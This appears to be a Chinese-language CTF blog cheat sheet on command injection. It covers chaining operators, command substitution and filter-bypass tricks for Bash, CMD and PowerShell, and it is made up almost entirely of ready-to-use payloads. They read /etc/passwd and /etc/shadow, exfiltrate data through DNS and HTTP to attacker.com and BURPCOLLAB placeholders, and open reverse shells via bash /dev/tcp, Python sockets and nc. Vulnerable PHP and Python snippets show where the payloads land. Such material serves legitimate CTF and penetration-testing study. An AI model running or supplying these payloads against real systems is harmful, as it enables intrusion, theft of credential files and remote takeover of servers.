---
title: '命令注入与拼接技巧速查'
published: 2026-04-20
description: 'CTF Web 命令注入常用拼接符、绕过技巧与实战 payload 汇总'
tags: [Web, 命令注入, RCE, bypass, CTF]
category: Web
draft: false
---

> 所有内容仅用于合法授权的安全研究与学习

---

## 一、基础拼接符号

### 1.1 Linux / Bash

| 符号 | 名称 | 行为 | 示例 |
|---|---|---|---|
| `;` | 分号 | 顺序执行，不管前命令是否成功 | `cmd1 ; cmd2` |
| `&&` | 逻辑与 | 前成功（返回0）才执行后 | `cmd1 && cmd2` |
| `\|\|` | 逻辑或 | 前失败（非0）才执行后 | `cmd1 \|\| cmd2` |
| `\|` | 管道 | 前的 stdout 作为后的 stdin | `cmd1 \| cmd2` |
| `&` | 后台 | 前台启动后台进程，同时继续执行 | `cmd1 & cmd2` |
| `\n` / `%0a` | 换行符 | 等同于 `;`，URL编码场景常用 | `cmd1%0acmd2` |
| `\r\n` / `%0d%0a` | 回车换行 | Windows/HTTP 场景下的换行 | `cmd1%0d%0acmd2` |

### 1.2 Windows CMD

| 符号 | 行为 | 示例 |
|---|---|---|
| `&` | 顺序执行 | `cmd1 & cmd2` |
| `&&` | 前成功才执行后 | `cmd1 && cmd2` |
| `\|\|` | 前失败才执行后 | `cmd1 \|\| cmd2` |
| `\|` | 管道 | `cmd1 \| cmd2` |
| `%0a` | URL编码换行（适用于HTTP参数传入cmd.exe的场景） | `cmd1%0acmd2` |

### 1.3 PowerShell

```powershell
cmd1 ; cmd2          # 顺序执行
cmd1 && cmd2         # 前成功才执行（PS 7+）
cmd1 || cmd2         # 前失败才执行（PS 7+）
cmd1 | cmd2          # 管道
cmd1 & { cmd2 }      # 调用运算符
```

---

## 二、命令替换（Linux）

命令替换用于将一个命令的输出嵌入另一个命令中：

```bash
# 反引号（旧式写法）
echo `whoami`
echo `cat /etc/passwd`

# $() 写法（推荐，可嵌套）
echo $(whoami)
echo $(cat /etc/passwd)

# 嵌套使用
echo $(echo $(id))

# 在赋值中使用
x=$(id); echo $x
```

---

## 三、空格绕过技巧

当应用过滤了空格字符时：

```bash
# ${IFS} — 内部字段分隔符，默认含空格/tab/换行
cat${IFS}/etc/passwd
cat${IFS%?}/etc/passwd     # 去掉最后一个字符，还是空格

# $IFS$9 — 常用变体
cat$IFS$9/etc/passwd

# Tab 字符（%09）
cat%09/etc/passwd

# 花括号（Brace Expansion）
{cat,/etc/passwd}

# 重定向绕过
cat</etc/passwd
cat<>/etc/passwd

# $'\x20' 表示空格的十六进制
X=$'\x20'; cat${X}/etc/passwd
```

---

## 四、关键字过滤绕过

### 4.1 字符串拼接

```bash
# 单引号插入（不影响字符串内容）
c'a't /etc/passwd
c''a''t /etc/passwd

# 双引号插入
c"a"t /etc/passwd
ca"t" /etc/passwd

# 反斜杠转义（对shell无意义但绕过简单过滤）
ca\t /etc/passwd
/bin/ca\t /etc/passwd

# 变量拼接
a=ca;b=t;$a$b /etc/passwd
X=ca;Y=t;$X$Y /etc/passwd

# 环境变量切片拼接
echo ${PATH:0:1}    # 取 PATH 第一个字符（通常是 /）
${PATH:0:1}etc${PATH:0:1}passwd
```

### 4.2 编码绕过

```bash
# 十六进制编码
$(printf '\x63\x61\x74') /etc/passwd     # cat
$'\x63\x61\x74' /etc/passwd

# 八进制编码
$(printf '\143\141\164') /etc/passwd     # cat

# base64 解码执行
echo "d2hvYW1p" | base64 -d | bash       # whoami
`echo "d2hvYW1p" | base64 -d`

# rev 反转字符串
echo "tac" | rev                          # cat
$(rev<<<tac) /etc/passwd
```

### 4.3 通配符绕过

```bash
# ? 匹配单个字符
/???/??t /etc/passwd          # /bin/cat
/???/b??h                     # /bin/bash
/?i?/??t /etc/passwd

# * 匹配任意字符
/bin/c*t /etc/passwd
/bin/ca* /etc/passwd

# 字符类
/bin/[c]at /etc/passwd
/[b]in/cat /etc/passwd
```

### 4.4 路径绕过

```bash
# 绝对路径代替命令名
/bin/cat /etc/passwd
/usr/bin/id

# 环境变量中提取路径字符
${HOME:0:1}           # / (如果HOME=/home/user)
${SHELL:0:1}          # /

# 利用现有路径字符构造新路径
echo $SHELL           # /bin/bash
echo ${SHELL%%bash}   # /bin/
# 利用切片拼接 /bin/cat
```

---

## 五、过滤关键字符的绕过

### 5.1 过滤了 `/`

```bash
# 使用变量存储 /
SLASH=/; ${SLASH}bin${SLASH}cat ${SLASH}etc${SLASH}passwd
echo ${HOME} | cut -c1   # 取 HOME 的第一个字符 /

# 利用 cd + 相对路径
cd /etc; cat passwd

# ${PATH:0:1}
${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd
```

### 5.2 过滤了 `.`

```bash
# 用 source 代替 .
source script.sh

# 用绝对路径避免相对路径中的 .
```

### 5.3 过滤了引号

```bash
# 使用 $() 代替
cat $(echo /etc/passwd)

# 变量赋值不需要引号
x=/etc/passwd; cat $x
```

### 5.4 过滤了括号 `()`

```bash
# 不用括号的命令替换（反引号）
echo `id`
x=`cat /etc/passwd`

# 大括号（调用函数时也可用）
{id}
```

### 5.5 过滤了 `cat`

```bash
# 替代命令
tac /etc/passwd          # 反向输出
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
nl /etc/passwd           # 带行号
strings /etc/passwd
od -c /etc/passwd        # 八进制dump
xxd /etc/passwd          # 十六进制dump
base64 /etc/passwd       # base64编码输出
rev /etc/passwd          # 反转每行字符

# 重定向读取
while read line; do echo $line; done < /etc/passwd

# python 读取
python3 -c "print(open('/etc/passwd').read())"
python3 -c "import sys;sys.stdout.write(open('/etc/passwd').read())"

# awk / sed
awk '{print}' /etc/passwd
sed '' /etc/passwd

# cp 到可访问路径
cp /etc/passwd /var/www/html/p.txt
```

---

## 六、Windows 特殊技巧

### 6.1 命令绕过

```cmd
# 插入无意义字符
wh^o^am^i                 # ^ 是转义符，插入不影响执行
who"am"i
w"h"o"a"m"i"

# 变量延迟展开
set x=who
set y=ami
%x%%y%

# FOR 循环嵌套执行
for /f %i in ('whoami') do @echo %i
```

### 6.2 PowerShell 绕过

```powershell
# IEX 执行字符串
IEX "whoami"
Invoke-Expression "whoami"

# 编码执行（-EncodedCommand）
powershell -EncodedCommand dwBoAG8AYQBtAGkA    # base64(whoami)

# 字符拼接
$c = 'who' + 'ami'; Invoke-Expression $c

# 通过环境变量
$env:ComSpec                                    # C:\Windows\System32\cmd.exe
& $env:ComSpec /c whoami
```

---

## 七、特殊场景

### 7.1 PHP system/exec 中

```php
// 参数中注入
system("ping " . $_GET['ip']);
// payload: 127.0.0.1 ; cat /etc/passwd
// payload: 127.0.0.1 && cat /etc/passwd
// payload: 127.0.0.1 | cat /etc/passwd
```

### 7.2 Python subprocess 中

```python
# 使用 shell=True 时存在注入风险
subprocess.call("ping " + user_input, shell=True)
# payload: 127.0.0.1 ; id
```

### 7.3 盲命令注入（无回显）

```bash
# 时间盲注
ping -c 5 127.0.0.1    # 延迟5秒

# DNS带外（OOB）
curl http://$(whoami).attacker.com
ping `whoami`.attacker.com
nslookup `id`.attacker.com

# 写文件带外
whoami > /var/www/html/output.txt
id > /tmp/x; curl http://attacker.com/?x=$(cat /tmp/x)

# nc 反弹
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## 八、过滤检测与绕过思路

```
检测到的过滤字符 → 对应绕过方案

空格被过滤      → ${IFS}, %09, <, {cmd,arg}
/ 被过滤        → ${PATH:0:1}, 变量拼接, cd 切换
引号被过滤      → 反引号, $(), 不用引号直接用变量
字母被过滤      → hex编码 \x??, base64解码, 变量拼接
cat被过滤       → tac/more/less/head/tail/od/xxd/awk
括号被过滤      → 反引号 ``
换行被过滤      → ;, &&, ||, &
;被过滤         → %0a换行, &&, ||
数字被过滤      → $((表达式)), ${#变量}取长度当数字
```

---

## 九、实战 Payload 模板

### 基础探测

```bash
# 无回显探测（DNS）
;curl http://$(whoami).BURPCOLLAB/
;ping -c1 `id`.BURPCOLLAB

# 有回显探测
;id
;whoami
;cat /etc/passwd
```

### 读文件

```bash
;cat /etc/passwd
;cat${IFS}/etc/shadow
;base64 /etc/passwd
;xxd /etc/passwd | xxd -r
```

### 反弹 Shell

```bash
# bash
bash -i >& /dev/tcp/IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

# URL编码版本（GET参数中）
bash%20-i%20>%26%20/dev/tcp/IP/PORT%200>%261

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'

# nc
nc -e /bin/bash IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```
